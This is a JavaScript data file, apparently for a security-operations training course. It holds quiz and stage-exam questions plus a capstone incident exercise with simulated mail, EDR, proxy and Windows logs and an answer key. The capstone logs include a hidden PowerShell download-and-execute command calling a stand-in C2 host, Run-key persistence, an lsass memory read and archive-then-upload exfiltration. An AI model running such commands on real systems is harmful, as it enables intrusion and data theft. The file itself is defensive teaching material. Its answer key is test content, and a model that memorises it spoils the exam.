    M('Which pattern suggests lateral movement?', ['A user browsing the intranet', 'Logon type 3 from one workstation to a server with a service account, then event 7045 PSEXESVC', 'A DNS lookup for a news site', 'A failed print job'], 1, 'Network logon plus remote service creation is the PsExec signature.'),
    M('What does chain of custody document?', ['The attacker\'s steps', 'Who collected and handled each piece of evidence, and when', 'The firewall rules', 'Staff shift patterns'], 1, 'It keeps evidence trustworthy and usable in legal or disciplinary proceedings.'),
  ],
  chal: {
    title: 'Capstone: the Northwind incident',
    brief: 'Four log sources, one attack. Build a timeline first, then answer. Allow 45 minutes. This is the practical half of your final test.',
    evidence: `# All times UTC, 2026-11-10

== MAIL GATEWAY ==
08:41:07  from=<hr@payro11-update.example>  to=<d.rusu@northwind.example>  subject="Salary adjustment 2026"  attachment=Salary_2026.xlsm  verdict=delivered
08:41:09  from=<hr@payro11-update.example>  to=<a.popa@northwind.example>  subject="Salary adjustment 2026"  attachment=Salary_2026.xlsm  verdict=quarantined

== EDR (host WS-HR-014, 10.20.4.14, user d.rusu) ==
08:52:31  excel.exe (pid 4412) opened C:\\Users\\d.rusu\\Downloads\\Salary_2026.xlsm
08:52:48  excel.exe -> powershell.exe -w hidden -c "iwr http://updates.cdn-metrics.example/s.ps1 | iex"
08:53:02  powershell.exe wrote C:\\ProgramData\\svchost32.exe
08:53:05  reg.exe add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v Updater /d C:\\ProgramData\\svchost32.exe
09:40:12  svchost32.exe read memory of lsass.exe

== PROXY ==
08:52:50  10.20.4.14  GET   http://updates.cdn-metrics.example/s.ps1          200  bytes_out=310       bytes_in=2048
08:53:10  10.20.4.14  POST  https://updates.cdn-metrics.example/api/ping      200  bytes_out=412       bytes_in=96     (repeats every 60 s)
11:20:14  10.20.9.5   POST  https://updates.cdn-metrics.example/upload        200  bytes_out=734003200 bytes_in=120

== WINDOWS EVENTS (host FS-01, 10.20.9.5, file server) ==
10:14:22  4625  Account=svc_filesync  LogonType=3  Source=10.20.4.14
10:14:40  4625  Account=svc_filesync  LogonType=3  Source=10.20.4.14
10:15:03  4624  Account=svc_filesync  LogonType=3  Source=10.20.4.14
10:15:40  7045  Service installed: PSEXESVC
11:05:09  4688  Process=7z.exe  CommandLine="7z a -pS3cret C:\\Temp\\hr.7z D:\\Shares\\HR\\*"  Account=svc_filesync`,
    qs: [
      ['Hostname of patient zero', ['WS-HR-014'], ''],
      ['File name of the malicious attachment', ['Salary_2026.xlsm'], ''],
      ['Time of the first malicious code execution (HH:MM:SS)', ['08:52:48'], ''],
      ['C2 domain', ['updates.cdn-metrics.example', 'updates[.]cdn-metrics[.]example', 'cdn-metrics.example'], ''],
      ['ATT&CK technique ID (with sub-technique) for the persistence at 08:53:05', ['T1547.001'], 'T####.###'],
      ['Which account was used for lateral movement?', ['svc_filesync'], ''],
      ['Which tool does event 7045 on FS-01 point to?', ['psexec', 'psexec.exe', 'sysinternals psexec'], ''],
      ['From which host was data exfiltrated?', ['FS-01'], 'Hostname'],
      ['Roughly how much data left, in MB (whole number)?', ['700', '700mb', '734', '734mb'], 'bytes / 1024 / 1024'],
    ],
  },
},
];

/* ---------- stage exams: extra scenario questions ---------- */
const stages = [
  { name: 'Networks and frameworks', weeks: [1, 2, 3], blurb: 'Speak the language of attacks and read traffic.', extra: [
    M('Wireshark shows one source sending SYN packets to ports 1 to 1024 of a server within two seconds. Most replies are RST. What are you looking at?', ['A DDoS attack', 'A port scan', 'Normal browsing', 'DNS tunnelling'], 1, 'Sequential ports, SYN only, mostly RST replies: a scan mapping open services.'),
    M('Your team can either block the attacker\'s current file hash or write a detection for how their loader behaves. Which hurts the attacker more, and why?', ['The hash, because it is exact', 'The behaviour, because changing TTPs is costly while a hash changes with one byte', 'Both are equal', 'Neither has any effect'], 1, 'Top of the Pyramid of Pain versus the bottom.'),
    M('A host sends ICMP echo requests with 1,400-byte payloads to one external IP continuously for an hour. What should you suspect?', ['A broken cable', 'ICMP tunnelling or exfiltration', 'A Windows update', 'ARP poisoning'], 1, 'Normal pings are small and brief. Large, sustained ICMP payloads can carry data.'),
    M('What does this Snort rule detect? alert tcp any any -> $HOME_NET 22 (flags:S; threshold: type both, track by_src, count 20, seconds 60; sid:1000010;)', ['Any SSH login', 'A single source opening 20 or more SSH connections in a minute, typical of brute force', 'SSH key exchange errors', 'Outbound SSH'], 1, 'The threshold tracks SYNs per source toward port 22.'),
    M('An analyst sees regular HTTPS connections from a server to a domain registered yesterday. Which Kill Chain phase does this most likely belong to?', ['Reconnaissance', 'Delivery', 'Command and Control', 'Weaponization'], 2, 'An already compromised host talking to attacker infrastructure is C2.'),
    M('ATT&CK lists T1046 "Network Service Discovery" under which tactic?', ['Initial Access', 'Discovery', 'Exfiltration', 'Impact'], 1, 'Scanning for services from inside a network is Discovery.'),
  ] },
  { name: 'Email, web and Windows', weeks: [4, 5, 6], blurb: 'The three places most alerts come from.', extra: [
    M('An email passes SPF and DKIM for cornpany-payments.example. The display name says "Company Payments". What is the right conclusion?', ['It is safe, authentication passed', 'Authentication only proves the sending domain; this is a lookalike domain', 'DKIM is broken', 'It must be internal'], 1, 'Passing checks for an attacker-owned lookalike domain proves nothing about legitimacy.'),
    M('The Security log shows event 4625 for 150 different accounts from one source, one attempt each, in five minutes. What is this?', ['Brute force on one account', 'Password spraying', 'Kerberoasting', 'A misconfigured printer'], 1, 'One or two common passwords tried across many accounts stays under lockout thresholds.'),
    M('On a server you see 4624 type 3 from a workstation, followed by 7045 "PSEXESVC". What happened?', ['A Windows update', 'Remote command execution with PsExec, likely lateral movement', 'An RDP session', 'A backup job'], 1, 'PsExec authenticates over SMB and installs a temporary service.'),
    M('The web log shows a burst of 500 errors on requests containing UNION SELECT, then 200 responses with large sizes. What is the best reading?', ['The server crashed', 'SQL injection probing that eventually succeeded', 'A search-engine crawler', 'A load test'], 1, 'Errors while the attacker finds the right syntax, then data returned.'),
    M('A user received "invoice.pdf.lnk". Why is it dangerous?', ['PDFs are always malicious', 'It is a shortcut that can run commands while looking like a PDF', 'It is too large', 'LNK files are encrypted'], 1, 'Windows hides the .lnk extension, and a shortcut can launch PowerShell with arguments.'),
    M('After a successful RDP logon, which pair of events would show the attacker creating a backdoor admin account?', ['4634 then 4624', '4720 then 4732', '4768 then 4769', '1102 then 4625'], 1, '4720 account created, 4732 added to a local group such as Administrators.'),
  ] },
  { name: 'Linux, malware and SIEM', weeks: [7, 8, 9], blurb: 'Investigate hosts and query at scale.', extra: [
    M('auth.log shows "Accepted publickey for root" from an unknown IP, and /root/.ssh/authorized_keys was modified yesterday. What happened?', ['A password reset', 'The attacker added an SSH key for persistence', 'A normal admin login', 'A cron failure'], 1, 'An added public key gives password-less access that survives password changes.'),
    M('What does this SPL find? index=win EventCode=4625 | stats dc(user) as users by src_ip | where users > 20', ['Users with more than 20 logons', 'Sources failing logons against more than 20 distinct accounts: password spraying', 'Hosts with 20 processes', 'Accounts locked 20 times'], 1, 'dc() is distinct count. Many accounts per source is the spraying signature.'),
    M('EDR shows excel.exe -> cmd.exe -> powershell.exe -> rundll32.exe. What is your first assessment?', ['Normal Office behaviour', 'A malicious document executing code through LOLBins', 'A Windows update', 'A printer driver install'], 1, 'Office spawning shells and proxy-execution binaries is a strong malicious pattern.'),
    M('You confirm a malicious hash on one endpoint. What is the best next step?', ['Close the alert', 'Search for the hash and related indicators across all endpoints to find the scope', 'Reboot the endpoint', 'Email the hash to all staff'], 1, 'One infected host is rarely the only one. Scoping comes before closing.'),
    M('On Linux, ps shows a process whose binary is "/tmp/x (deleted)". What does this mean and where can you recover it?', ['It crashed; nowhere', 'The file was removed from disk while still running; recover from /proc/PID/exe', 'It is a kernel thread; /boot', 'It is a zombie; /var/log'], 1, 'Attackers delete the file to hide it. The kernel keeps it reachable through /proc.'),
    M('A SIEM alert has no time filter in its drill-down search and returns two million events. What should you do first?', ['Export everything', 'Restrict the time range around the alert, then add host or user filters', 'Add | head 10 at the end', 'Raise a bug'], 1, 'Narrow by time and entity first; transform later.'),
  ] },
  { name: 'Triage, identity and incident response', weeks: [10, 11, 12], blurb: 'Put it together and prove it.', final: true, extra: [
    M('CloudTrail shows ConsoleLogin without MFA from a new country, then CreateUser and AttachUserPolicy AdministratorAccess. What is happening?', ['A routine onboarding', 'Account takeover followed by persistence and privilege escalation', 'A billing error', 'A failed deployment'], 1, 'A stolen identity creating a new admin identity for itself.'),
    M('Two identical "malware detected" alerts arrive: one on the finance domain controller, one on a disposable test VM. Which do you take first and why?', ['The test VM, it is quicker', 'The domain controller, because asset criticality drives priority', 'Whichever is older', 'Neither'], 1, 'Same severity, very different business impact.'),
    M('Which sentence belongs in a professional incident report?', ['"Something weird happened on a PC in the morning."', '"At 08:52:48 UTC excel.exe on WS-HR-014 (user d.rusu) launched PowerShell, which downloaded s.ps1 from updates.cdn-metrics.example."', '"The user is probably to blame."', '"Fixed it."'], 1, 'Precise time, host, user, action and indicator. No blame, no vagueness.'),
    M('After isolating one infected host you find a second host beaconing to the same domain. What does this tell you?', ['The incident is over', 'Scope was incomplete: return to analysis and hunt the indicators company-wide', 'The firewall is broken', 'It is a false positive'], 1, 'IR is a loop. New findings send you back to detection and analysis.'),
    M('DC logs show 46 service ticket requests (4769, encryption 0x17) from one user in under a minute. Which remediation matters most?', ['Reboot the DC', 'Reset the targeted service account passwords to long random values and review the requesting host', 'Disable Kerberos', 'Clear the event log'], 1, 'Kerberoasting only pays off against weak service account passwords. Treat the requesting host as compromised.'),
    M('During triage you are unsure whether an alert is a true positive. What is the best course?', ['Guess and close', 'Document what you checked, state the uncertainty, and escalate with your evidence', 'Leave it unassigned', 'Mark it false positive to protect the metrics'], 1, 'Honest, documented uncertainty is far better than a confident wrong closure.'),
  ] },
];

module.exports = { weeks, stages };
